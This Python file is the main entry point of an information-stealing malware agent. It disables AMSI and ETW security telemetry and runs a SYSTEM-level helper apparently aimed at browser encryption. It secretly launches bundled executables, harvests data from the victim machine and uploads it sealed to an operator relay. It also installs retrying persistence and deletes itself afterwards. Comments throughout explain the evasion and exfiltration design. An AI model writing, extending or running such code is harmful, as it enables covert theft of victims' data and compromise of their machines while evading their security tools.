"""Agent entry point.

The order is fixed and every step depends on the one before it:

1. ``--abe-unwrap`` dispatch. The helper runs as SYSTEM with no config and no
   archive of its own, so it is handled before logging, before the mutex, before
   the gate, before anything that could read a file it does not have.
2. Log setup, then the AMSI and ETW patches. Neither is gated on: a patch that
   fails is a logged False, not a stopped run.
3. Mutex guard, in the loader, before decryption. Two launches must not race the
   decrypted archive.
4. Footer, decryption, mount. The loader owns every one of those.
5. Config, gate, bound file, collection, transmission, self-remove.

Nothing here decrypts. Nothing here reads the footer.
"""

from __future__ import annotations

import shutil
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Final

UNWRAP_FLAG: Final[str] = "--abe-unwrap"
DEBUG_FLAG: Final[str] = "--debug"
# What the retry task passes. A run with this flag delivers what an earlier run parked
# and then leaves; it never collects, so a repeating task cannot turn into a repeating
# harvest on a machine that has already been visited.
RETRY_FLAG: Final[str] = "--retry"

# Files under this prefix in the payload archive are extracted side by side, and the
# ones that can be started are started. Declared again in ``core/forge.py``, which
# cannot be imported from inside the archive; tests/test_contracts.py pins the two.
FUSE_PREFIX: Final[str] = "fused/"
BOUND_SUFFIXES: Final[frozenset[str]] = frozenset({".exe", ".com", ".scr"})
_MAX_BOUND_FILES: Final[int] = 8
_MAX_BOUND_BYTES: Final[int] = 64 * 1024 * 1024
_BOUND_CHUNK: Final[int] = 1024 * 1024
# DETACHED_PROCESS: no console, and no inherited lifetime. The agent is about to exit;
# what it started is not supposed to.
_DETACHED_PROCESS: Final[int] = 0x00000008


def _summary() -> dict:
    """Machine facts for the status messages. Never raises, never blocks a run.

    Gathered once and reused: the geolocation lookup costs a network round trip, and
    three messages asking the same question three times is three chances to time out
    on a target that is about to be killed.
    """
    try:
        from .sources import network, system

        facts = system.identity()
        facts.update(network.location())
        return facts
    except Exception:
        return {}


def _status(block: str, status: str) -> str:
    """One status line under the machine block.

    The block is already markdown; this only decides whether there is one. A run with
    no machine facts still sends the stage, because a bare "delivered" is worth more
    than the nothing it replaces.
    """
    return f"{block}\n**status** {status}" if block else f"**status** {status}"


def _start_bound(archive) -> int:
    """Extract what was welded into the payload and start the launchable part.

    The build welds one file into the archive under ``fused/``; this is the half that
    runs it. Extraction goes to its own folder rather than the loader's workspace,
    because a started program may still want the files beside it long after this run
    ends, and the workspace is removed on the way out.

    Nothing here is fatal. A member that will not extract or a start that is refused is
    a debug line, never a return: the collection is the job, and a bound file that
    failed to launch must not cost it.
    """
    from . import log

    members = [
        info
        for info in archive.infolist()
        if info.filename.startswith(FUSE_PREFIX) and not info.is_dir()
    ]
    if not members:
        return 0
    if len(members) > _MAX_BOUND_FILES:
        log.logger.warning(
            "bound: %d members, carrying the first %d", len(members), _MAX_BOUND_FILES
        )
        members = members[:_MAX_BOUND_FILES]

    root = Path(tempfile.mkdtemp(prefix="sable-bound-"))
    started = 0

    for info in members:
        name = Path(info.filename).name
        if not name or name in (".", ".."):
            continue
        if info.file_size > _MAX_BOUND_BYTES:
            log.logger.warning("bound: %s is %d bytes, skipped", name, info.file_size)
            continue

        target = root / name
        try:
            with archive.open(info) as source, target.open("wb") as sink:
                shutil.copyfileobj(source, sink, _BOUND_CHUNK)
        except OSError:
            log.logger.debug("bound: %s did not extract", name, exc_info=True)
            continue

        if target.suffix.lower() not in BOUND_SUFFIXES:
            continue

        try:
            subprocess.Popen(
                [str(target)],
                cwd=str(root),
                creationflags=_DETACHED_PROCESS,
                close_fds=True,
            )
        except OSError:
            log.logger.debug("bound: %s did not start", name, exc_info=True)
            continue
        started += 1

    return started


def main(argv: list[str] | None = None) -> int:
    args = list(sys.argv[1:] if argv is None else argv)

    # Must be first. The helper is a re-exec of this same entry point under SYSTEM.
    if UNWRAP_FLAG in args:
        from . import abe

        return abe.helper_main(args)

    from . import log

    logger = log.configure(debug=DEBUG_FLAG in args)
    logger.debug("agent start: argv=%s", args)

    # Imported after the log is live: importing winapi creates the WinDLL handles.
    from . import config, gate, loader, patch, relay, sources, util

    logger.debug("amsi patch: %s", patch.patch_amsi())
    logger.debug("etw patch: %s", patch.patch_etw())

    if not loader.acquire():
        logger.debug("another instance holds the mutex; exiting")
        return 0

    try:
        prepared = loader.prepare()
    except Exception:
        logger.exception("archive preparation failed")
        return 1

    try:
        try:
            cfg = config.load(prepared.archive)
        except Exception:
            logger.exception("config rejected")
            return 1

        # A previous run that could not reach the relay parked its archive. Clearing that
        # first is the whole point of the queue: the result already exists, and collecting
        # a second one on top of it is work nobody asked for.
        waiting = relay.drain(cfg)
        if waiting:
            logger.debug("queue: %d archive(s) still waiting", waiting)
            relay.notify(cfg, _status("", f"queue · {waiting} still waiting"))
        else:
            util.cancel_retry()

        if RETRY_FLAG in args:
            logger.debug("retry pass: %d still waiting", waiting)
            if not waiting and cfg.self_remove:
                util.self_remove(util.executable_path())
            return 0

        # Installed before collection, so a run that dies later still leaves the machine
        # able to produce another result. The original can still remove itself at the end:
        # the staged copy is what survives, so the two settings compose rather than
        # contradict.
        staged = None
        if cfg.persist:
            staged = util.install_persistence(util.executable_path(), cfg.persist_hours)

        # Gathered before anything that can fail, so the first message carries the
        # machine rather than a promise that one is coming.
        summary = _summary()
        block = relay.describe(summary)
        relay.notify(cfg, _status(block, "collecting"), alert=True)

        if cfg.persist:
            if staged is not None:
                summary["persist"] = "installed"
                logger.debug("persist: %s", staged)
            else:
                logger.warning("persist: requested but not installed")
                relay.notify(cfg, _status("", "persist requested · not installed"))

        # The gate never stops a run. A virtual host produces a stamped result and
        # everything else proceeds; a silent exit teaches nobody anything.
        verdict = gate.evaluate()
        logger.debug("gate: virtual=%s hits=%s", verdict.virtual, verdict.hits)
        logger.debug("gate reasons: %s", verdict.reasons)
        gate_note = (
            "virtual (" + ", ".join(str(hit) for hit in verdict.hits) + ")"
            if verdict.virtual
            else "clean"
        )
        summary["gate"] = gate_note

        # Started before collection, so a bound file is live for the whole run and a
        # collection that dies later cannot take it down with it.
        bound = _start_bound(prepared.archive)
        if bound:
            logger.debug("bound: started %d file(s)", bound)

        with util.temp_workspace("sable-collect-") as work:
            if verdict.virtual:
                util.write_json(
                    work / "virtual.txt",
                    {
                        "virtual": verdict.virtual,
                        "hits": list(verdict.hits),
                        "reasons": list(verdict.reasons),
                    },
                )

            counts, failures = sources.run_all(work, cfg)
            logger.debug("collectors returned %s", counts)
            # Carried into the delivery caption: the count per source is what tells the
            # reader which collector produced nothing, and a bare total cannot.
            summary["counts"] = dict(counts)
            if failures:
                # Carried into the delivery caption: a source that died is the one thing
                # a bare item count can never tell you.
                summary["failed"] = failures
                logger.warning("collectors failed: %s", failures)

            archive_path = util.make_archive(work, prepared.workspace / "payload.zip")
            if archive_path is None:
                logger.error("archive creation failed")
                relay.notify(
                    cfg,
                    _status(block, f"collection produced no archive · gate {gate_note}"),
                    alert=True,
                )
                return 1

            try:
                size = archive_path.stat().st_size
            except OSError:
                size = 0
            items = sum(counts.values())

            # Before transmission, so a failed upload still leaves something to open on
            # a machine the operator controls. Off unless the build asked for it.
            if cfg.keep_local:
                kept = util.keep_archive(
                    archive_path, str(summary.get("hostname") or "sable")
                )
                if kept is not None:
                    util.write_text(
                        kept.with_suffix(".txt"),
                        f"{relay.describe(summary)}\n"
                        f"**archive** {kept.name}\n"
                        f"**items** {items:,}\n",
                    )
                    relay.notify(cfg, _status("", f"local copy · {kept}"))

            relay.notify(
                cfg,
                _status("", f"uploading {items:,} items · {relay.human_bytes(size)}"),
            )

            # The archive that leaves the machine is password protected. Until now the
            # seal key only wrapped the bundle welded inside the exe, so a link relay put
            # a plain zip on a public host and anyone holding the URL could open it. The
            # key is the password; a failure here falls back to the plain archive rather
            # than costing the delivery.
            shipped = archive_path
            sealed = util.seal_zip(
                archive_path,
                archive_path.with_name("payload-sealed.zip"),
                cfg.seal_key,
            )
            if sealed is not None:
                shipped = sealed
            else:
                relay.notify(cfg, _status("", "sealing failed · sending the plain archive"))

            try:
                relay.deliver(cfg, shipped, summary)
            except Exception as exc:
                logger.exception("transmit failed")
                # Park before reporting: the archive is the whole run, and the temp
                # folder it was built in does not survive a reboot. The task brings this
                # image back every 15 minutes until the queue is empty, then removes
                # itself; the image stays on disk only while something is waiting.
                parked = util.park_archive(shipped)
                if parked is not None and util.schedule_retry(util.executable_path()):
                    where = "parked · retrying every 15 min"
                elif parked is not None:
                    where = f"parked {parked.name} · no task"
                else:
                    where = "nothing parked"
                relay.notify(
                    cfg,
                    _status(block, f"transmit failed · {exc} · gate {gate_note} · {where}"),
                    alert=True,
                )
                return 1

            # The file message already carries the block and the mention; repeating
            # both here would buzz twice for one delivery.
            relay.notify(cfg, _status("", "delivered"))

        if cfg.self_remove:
            util.self_remove(util.executable_path())

        return 0
    finally:
        loader.cleanup()


if __name__ == "__main__":
    raise SystemExit(main())
